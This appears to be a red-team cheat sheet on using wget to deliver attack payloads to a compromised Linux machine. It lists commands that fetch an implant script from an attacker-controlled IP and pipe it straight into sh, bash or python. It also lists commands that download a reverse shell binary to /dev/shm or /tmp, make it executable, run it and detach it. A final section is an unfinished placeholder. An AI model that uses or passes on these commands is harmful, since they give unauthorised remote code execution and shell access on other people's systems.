# Wget

## 01 - Fileless code execution

This is useful if the machine doesn't have `curl` pre-installed so you can use `wget` to execute it in memory.

```
$ wget --no-hsts -qO- http[s]://<IP>/implant.sh | sh

$ wget --no-hsts -qO- http[s]://<IP>/implant.sh | bash

$ wget --no-hsts -qO- http[s]://<IP>/implant.py | python
```

## 02 - Dropping on memory

Download reverse shell binary and execute it.

```
$ wget --no-hsts -P /dev/shm http[s]://<IP>/implant; chmod +x /dev/shm/implant; /dev/shm/implant & disown

$ wget --no-hsts -O /dev/shm/implant http[s]://<IP>/implant; chmod +x /dev/shm/implant; /dev/shm/implant & disown
```

## 03 - Dropping on disk

Download reverse shell binary and execute it.

```
$ wget --no-hsts -O /tmp/implant http[s]://<IP>/implant; chmod +x /tmp/implant; /tmp/implant & disown
```

## 03 - Compiled After Delivery

TODO: Fill this info

```
$ gcc
```

---
## References

### Github

- [hackerschoice: THC's favourite Tips, Tricks & Hacks (Cheat Sheet)](https://github.com/hackerschoice/thc-tips-tricks-hacks-cheat-sheet)

### GTFOArgs

- [GTFOArgs: wget](https://gtfoargs.github.io/gtfoargs/wget/)

### DMCXBlue

- [DMCXBlue: Attachments - Scripting Files](https://dmcxblue.gitbook.io/red-team-notes-2-0/red-team-techniques/initial-access/t1566-phishing/phishing-spearphishing-attachment/attachments-scripting-files)